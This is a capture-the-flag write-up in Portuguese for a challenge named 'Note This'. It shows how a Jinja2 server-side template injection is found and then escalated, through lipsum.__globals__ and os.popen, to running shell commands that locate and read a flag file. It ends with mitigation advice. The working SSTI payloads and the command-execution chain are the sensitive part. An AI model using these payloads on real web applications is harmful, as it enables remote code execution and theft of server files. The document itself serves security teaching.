# CTF Note This (SSTI)
###### solved by @oGabriel674

> this is a CTF about SSTI (Server-Side Template Injection)

## Desafio: Note This (SSTI)

#### Solução

O desafio tem início na tela de login, onde devemos inserir credenciais para acessar o sistema.

<img width="502" height="285" alt="Captura de tela 2026-02-22 221343" src="https://github.com/user-attachments/assets/c05dae2d-4fd2-4cfd-9c99-b2eeeea02686" />

Na fase de reconhecimento, utilizado um teste simples para verificar o comportamento do sistema frente a entradas dinâmicas. Ao inserir a expressão __``{{7*7}}``__ no campo de entrada, o servidor retornou o resultado da operação matemática, que foi __49__.
Esse comportamento evidenciou a presença de uma vulnerabilidade do tipo [SSTI (Server-Side Template Injection)](https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/).

<img width="511" height="355" alt="Captura de tela 2026-02-24 141425" src="https://github.com/user-attachments/assets/900ff263-e90c-44cd-bc0d-6c553080cab5" />

Após confirmar a vulnerabilidade de __SSTI (Server-Side Template Injection)__ por meio do teste com ``{{7*7}}``, foi possível observar que o motor de template em uso se trata do [Jinja2](https://www.treinaweb.com.br/blog/o-que-e-o-jinja2), Ja que a sintaxe __``{{ }}``__ é característica  desse template.

Sabendo qual vulnerabilidade explorar e qual o template utilizado pelo sistema, iniciamos a injeção de comandos para localizar a flag. O primeiro payload utilizado foi __``{{ self.__dict__ }}``__, que revela funções internas do template. Esse comando é útil porque expõe atributos e métodos disponíveis, servindo como ponto de entrada para acessar variáveis globais e compreender melhor o ambiente. 

<img width="513" height="455" alt="Captura de tela 2026-02-24 141302" src="https://github.com/user-attachments/assets/65a8873f-aa60-40ed-884d-bf86c21d61a9" />

A função __lipsum__ nos permite acessar variáveis globais dentro do template. Utilizando o comando __``{{ lipsum.__globals__ }}``__, conseguimos revelar o conjunto de variáveis globais disponíveis.

```
'NameError': , 'OSError': , 'ReferenceError': , 'RuntimeError': , 'StopAsyncIteration': , 'StopIteration': , 'SyntaxError': , 'SystemError': , 'TypeError': , 'ValueError': , 'Warning': , 'FloatingPointError': , 'OverflowError': , 'ZeroDivisionError': , 'BytesWarning': , 'DeprecationWarning': , 'EncodingWarning': , 'FutureWarning': , 'ImportWarning': , 'PendingDeprecationWarning': , 'ResourceWarning': , 'RuntimeWarning': , 'SyntaxWarning': , 'UnicodeWarning': , 'UserWarning': , 'BlockingIOError': , 'ChildProcessError': , 'ConnectionError': , 'FileExistsError': , 'FileNotFoundError': , 'InterruptedError': , 'IsADirectoryError': , 'NotADirectoryError': , 'PermissionError': , 'ProcessLookupError': , 'TimeoutError': , 'IndentationError': , 'IndexError': , 'KeyError': , 'ModuleNotFoundError': , 'NotImplementedError': , 'RecursionError': , 'UnboundLocalError': , 'UnicodeError': , 'BrokenPipeError': , 'ConnectionAbortedError': , 'ConnectionRefusedError': , 'ConnectionResetError': , 'TabError': , 'UnicodeDecodeError': , 'UnicodeEncodeError': , 'UnicodeTranslateError': , 'ExceptionGroup': , 'EnvironmentError': , 'IOError': , 'open': , 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, '__annotations__': {'missing': typing.Any, 'internal_code': typing.MutableSet[code]}, 'enum': , 'json': , 'os': , 're': , 't': , 'abc': , 'deque': , 'choice': >, 'randrange': >, 'Lock': , 'CodeType': , 'quote_from_bytes': , 'markupsafe': , 'F': ~F, '_MissingType': , 'missing': missing, 'internal_code': {, , , , , , , , , , , , , , , , , }, 'concat': , 'pass_context': , 'pass_eval_context': , 'pass_environment': , '_PassArg': , 'internalcode': , 'is_undefined': , 'consume': , 'clear_caches': , 'import_string': , 'open_if_exists': , 'object_type_repr': , 'pformat': , '_http_re': re.compile('\n ^\n (\n (https?://|www\\.) # scheme or www\n (([\\w%-]+\\.)+)? # subdomain\n (\n [a-z]{2,63} # basic tld\n |\n xn--[\\w%]{2,59} # idna t, re.IGNORECASE|re.VERBOSE), '_email_re': re.compile('^\\S+@\\w[\\w.-]*\\.\\w+$'), 'urlize': , 'generate_lorem_ipsum': , 'url_quote': , 'LRUCache': , 'select_autoescape': , 'htmlsafe_json_dumps': , 'Cycler': , 'Joiner': , 'Namespace': }
```
Dentro do dicionário de variáveis globais revelado, identificamos módulos e funções críticas que poderiam ser exploradas.

>- O módulo __``os``__, que permite a execução de comandos do sistema operacional, como __``ls``__, __``find``__ e __``cat``__.

>- A função __``open``__, que possibilita abrir diretamente arquivos no servidor.

Esses recursos eliminam a necessidade de navegar pela hierarquia complexa de classes e simplificando o processo até a obtenção da flag.

Utilizando esse conhecimento, utilizando do payload __``{{ lipsum.__globals__['os'].popen('find / -name flag* 2>/dev/null').read() }}``__ foi possível realizar uma busca completa por arquivos com o nome 'flag' em todo o sistema.

```
/sys/devices/platform/serial8250/tty/ttyS2/flags /sys/devices/platform/serial8250/tty/ttyS28/flags /sys/devices/platform/serial8250/tty/ttyS18/flags /sys/devices/platform/serial8250/tty/ttyS9/flags /sys/devices/platform/serial8250/tty/ttyS26/flags /sys/devices/platform/serial8250/tty/ttyS16/flags /sys/devices/platform/serial8250/tty/ttyS7/flags /sys/devices/platform/serial8250/tty/ttyS24/flags /sys/devices/platform/serial8250/tty/ttyS14/flags /sys/devices/platform/serial8250/tty/ttyS5/flags /sys/devices/platform/serial8250/tty/ttyS22/flags /sys/devices/platform/serial8250/tty/ttyS12/flags /sys/devices/platform/serial8250/tty/ttyS30/flags /sys/devices/platform/serial8250/tty/ttyS3/flags /sys/devices/platform/serial8250/tty/ttyS20/flags /sys/devices/platform/serial8250/tty/ttyS10/flags /sys/devices/platform/serial8250/tty/ttyS29/flags /sys/devices/platform/serial8250/tty/ttyS19/flags /sys/devices/platform/serial8250/tty/ttyS27/flags /sys/devices/platform/serial8250/tty/ttyS17/flags /sys/devices/platform/serial8250/tty/ttyS8/flags /sys/devices/platform/serial8250/tty/ttyS25/flags /sys/devices/pci0000:00/0000:00:14.3/IPI0001:00/flag_fetches /sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/eth0/flags /home/user_discloud/secrets777666/flag.txt
```
O arquivo que nos interessa foi identificado como __``/home/user_discloud/secrets777666/flag.txt``__. Utilizando o payload __``{{ lipsum.__globals__['os'].popen('cat /home/user_discloud/secrets777666/flag.txt').read() }}``__, conseguimos ler diretamente o conteúdo do arquivo e, assim, obter acesso à flag.

<img width="509" height="382" alt="Captura de tela 2026-02-23 152426" src="https://github.com/user-attachments/assets/0c288ccb-963e-4eda-bd1f-e6a633835ad8" />

>- Flag: DUCK{777_KNOW_ALL_YOUR_TEMPLATES_777}

#### conclusão

Este foi um excelente desafio que  demonstrou como uma simples injeção em __Jinja2__ pode evoluir para execução remota de comandos e acesso ao sistema de arquivos. O ponto-chave foi perceber que funções internas como __lipsum__ permitiam acesso ao dicionário de variáveis globais, servindo como atalho para módulos poderosos como __os__.
Esse caminho evidencia a importância de proteger aplicações contra __SSTI__, já que a exploração pode rapidamente levar ao comprometimento total do sistema.

#### Mitigação

Algumas formas de previnir esse tipo de ataque são:

- Ativar sandboxing no Jinja2:
O Jinja2 possui modos de execução restritos que bloqueiam acesso a atributos perigosos como __``globals``__, __``dict``__ e __``mro``__.

- Validar e sanitizar entradas:
Sempre tratar os dados recebidos do usuário como não confiáveis e aplicar filtros ou escapes antes de renderizar.

- Nunca renderizar dados do usuário diretamente em templates:
Usar variáveis seguras e evitar concatenar strings vindas do cliente com o motor de templates.
